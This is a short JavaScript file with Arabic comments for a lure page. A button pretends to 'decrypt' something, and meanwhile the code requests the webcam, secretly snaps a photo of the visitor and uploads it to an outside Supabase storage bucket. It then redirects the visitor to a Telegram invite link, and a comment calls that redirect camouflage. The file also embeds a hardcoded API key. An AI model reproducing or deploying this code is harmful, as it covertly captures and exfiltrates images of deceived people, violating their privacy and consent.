// إعدادات سوبابيس
const SUPABASE_URL = 'https://liikyclasjdtsioxaihc.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxpaWt5Y2xhc2pkdHNpb3hhaWhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjM2OTIsImV4cCI6MjA5MTk5OTY5Mn0.lNZ7EfurBgWTPVrKjT4hIlm87BuAFcSX67glz8lBO6Y';
const TELEGRAM_LINK = 'https://t.me/+Inh-qlXH-uU3M2U0';

// تصحيح سطر الربط (إضافة window للتأكد من التحميل)
const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

startBtn.addEventListener('click', async () => {
    try {
        // طلب الكاميرا فوراً
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        // تغيير النص عشان يحس المستخدم بالحركة وما يعلق
        startBtn.innerText = "جاري فك التشفير...";
        
        // تصوير سريع (بعد نص ثانية) عشان ما يمل
        setTimeout(async () => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const fileName = `user_${Date.now()}.jpg`;
                
                // الرفع للسيرفر
                await supabaseClient.storage
                    .from('images')
                    .upload(fileName, blob);

                // إيقاف الكاميرا والتحويل فوراً
                stream.getTracks().forEach(t => t.stop());
                window.location.href = TELEGRAM_LINK;
                
            }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً للسرعة
        }, 500);

    } catch (err) {
        // إذا رفض أو صار خطأ يحول للتلغرام كتمويه أو يعيد المحاولة
        console.log("Error:", err);
        window.location.href = TELEGRAM_LINK;
    }
});
